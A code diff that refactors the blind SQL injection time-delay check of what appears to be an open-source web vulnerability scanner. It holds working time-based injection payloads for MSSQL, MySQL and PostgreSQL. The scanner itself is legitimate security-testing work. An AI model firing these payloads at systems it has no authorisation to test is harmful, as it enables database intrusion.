@@ -23,8 +23,8 @@ import core.controllers.output_manager as om
 import core.data.constants.severity as severity
 
 from core.data.kb.vuln import Vuln
+from core.controllers.delay_detection.exact_delay_controller import ExactDelayController
 from core.controllers.delay_detection.exact_delay import ExactDelay
-from core.controllers.delay_detection.delay import Delay
 
 
 class blind_sqli_time_delay(object):
@@ -48,7 +48,7 @@ class blind_sqli_time_delay(object):
         '''
         for delay_obj in self._get_delays():
 
-            ed = ExactDelay(mutant, delay_obj, self._uri_opener)
+            ed = ExactDelayController(mutant, delay_obj, self._uri_opener)
             success, responses = ed.delay_is_controlled()
 
             if success:
@@ -73,24 +73,28 @@ class blind_sqli_time_delay(object):
         '''
         @return: A list of statements that are going to be used to test for
                  blind SQL injections. The statements are objects.
+                 
+                 IMPORTANT: Note that I need this function that generates
+                 unique instances of the delay objects! Adding this to a list
+                 that's defined at the class level will bring threading issues
         '''
         res = []
 
         # MSSQL
-        res.append(Delay("1;waitfor delay '0:0:%s'--"))
-        res.append(Delay("1);waitfor delay '0:0:%s'--"))
-        res.append(Delay("1));waitfor delay '0:0:%s'--"))
-        res.append(Delay("1';waitfor delay '0:0:%s'--"))
-        res.append(Delay("1');waitfor delay '0:0:%s'--"))
-        res.append(Delay("1'));waitfor delay '0:0:%s'--"))
+        res.append(ExactDelay("1;waitfor delay '0:0:%s'--"))
+        res.append(ExactDelay("1);waitfor delay '0:0:%s'--"))
+        res.append(ExactDelay("1));waitfor delay '0:0:%s'--"))
+        res.append(ExactDelay("1';waitfor delay '0:0:%s'--"))
+        res.append(ExactDelay("1');waitfor delay '0:0:%s'--"))
+        res.append(ExactDelay("1'));waitfor delay '0:0:%s'--"))
 
         # MySQL 5
         #
         # Thank you guys for adding sleep(seconds) !
         #
-        res.append(Delay("1 or SLEEP(%s)"))
-        res.append(Delay("1' or SLEEP(%s) and '1'='1"))
-        res.append(Delay('1" or SLEEP(%s) and "1"="1'))
+        res.append(ExactDelay("1 or SLEEP(%s)"))
+        res.append(ExactDelay("1' or SLEEP(%s) and '1'='1"))
+        res.append(ExactDelay('1" or SLEEP(%s) and "1"="1'))
 
         # MySQL 4
         #
@@ -114,9 +118,9 @@ class blind_sqli_time_delay(object):
         #res.append( delay('1" or BENCHMARK(2500000,MD5(1)) or "1"="1') )
 
         # PostgreSQL
-        res.append(Delay("1 or pg_sleep(%s)"))
-        res.append(Delay("1' or pg_sleep(%s) and '1'='1"))
-        res.append(Delay('1" or pg_sleep(%s) and "1"="1'))
+        res.append(ExactDelay("1 or pg_sleep(%s)"))
+        res.append(ExactDelay("1' or pg_sleep(%s) and '1'='1"))
+        res.append(ExactDelay('1" or pg_sleep(%s) and "1"="1'))
 
         # TODO: Add Oracle support
         # TODO: Add XXXXX support
